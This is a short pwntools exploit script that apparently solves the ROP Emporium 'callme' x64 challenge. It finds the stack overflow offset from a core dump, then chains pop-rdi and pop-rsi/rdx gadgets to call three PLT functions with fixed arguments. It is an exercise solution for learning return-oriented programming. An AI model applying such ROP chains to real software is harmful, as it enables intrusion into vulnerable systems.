from pwn import *

bin = '/home/kali/Downloads/ropemporium/challenge3/x64/callme'

bin= ELF(bin)
context.binary = bin
context.log_level = 'debug'

p= process(bin.path)
p.sendline(cyclic(400, n=8))
p.wait_for_close()
core= p.corefile

leak= core.read(core.rsp, 8)   #read from stack where ret crashed instead of reading eip/rip
offset= cyclic_find(leak, n=8)
print(f"Found offset {offset}")

call1= bin.plt['callme_one']
call2= bin.plt['callme_two']
call3= bin.plt['callme_three']
main= bin.symbols['exit']

rdi= next(bin.search(asm('pop rdi; ret;')))
rsirdx= next(bin.search(asm('pop rsi; pop rdx; ret;')))
ret= next(bin.search(asm('ret;')))

arg1= 0xdeadbeefdeadbeef
arg2= 0xcafebabecafebabe
arg3= 0xd00df00dd00df00d

chain= flat(b'A'* offset, 
                p64(rdi), p64(arg1), p64(rsirdx),p64(arg2), p64(arg3), p64(ret), p64(call1),
                p64(rdi), p64(arg1), p64(rsirdx),p64(arg2), p64(arg3), p64(ret), p64(call2),
                p64(rdi), p64(arg1), p64(rsirdx),p64(arg2), p64(arg3), p64(ret), p64(call3),
                p64(main))
            
p2= process(bin.path)           #bin.path because ELF object is not suitable for process()
p2.sendline(chain)
p2.interactive()

